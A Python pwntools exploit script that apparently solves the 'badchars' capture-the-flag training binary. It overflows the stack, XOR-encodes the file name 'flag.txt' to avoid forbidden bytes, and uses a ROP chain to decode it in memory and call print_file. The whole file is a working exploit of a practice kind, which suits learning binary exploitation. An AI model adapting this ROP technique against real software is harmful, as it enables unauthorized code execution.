#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.read(proc.corefile.sp, 4), alphabet="bcdefhijklmn")
    return ip_offset

exe = './badchars'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'debug'

# crafting the payload
offset = find_offset(cyclic(200, alphabet="bcdefhijklmn"))
info(f"Offset: {offset:x}")

data_section = elf.get_section_by_name('.data').header.sh_addr
info(f"Data Section: {data_section:x}")

encrypted_file_name = xor(b'flag.txt', 2)
info(f"File Name: {encrypted_file_name}")

pop_gadget = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
info(f'Pop Gadget: {pop_gadget:x}')

mov_gadget = elf.symbols.usefulGadgets + 0xC 
info(f'Move Gadget: {mov_gadget:x}')

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
info(f'Pop RDI: {pop_rdi}')

pop_r14_r15 = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
info(f"POP R14, R15: {pop_r14_r15:x}")

xploit = b""
address_offset = 0
for c in encrypted_file_name:
    xploit += pack(pop_r14_r15)
    xploit += pack(2)
    xploit += pack(data_section + address_offset)
    xploit += pack(elf.symbols.usefulGadgets)
    address_offset += 1

info(f'Decryption xploit: {xploit}')

payload = flat({ offset: [
        pop_gadget,
        encrypted_file_name,
        data_section,
        0,
        0,
        mov_gadget,
        xploit,
        pop_rdi,
        data_section,
        elf.symbols.print_file
    ] })
write('payload', payload)
info(f'Payload: {payload}')

# executing payload
io = start()
io.sendlineafter(b'>', payload)
io.interactive()
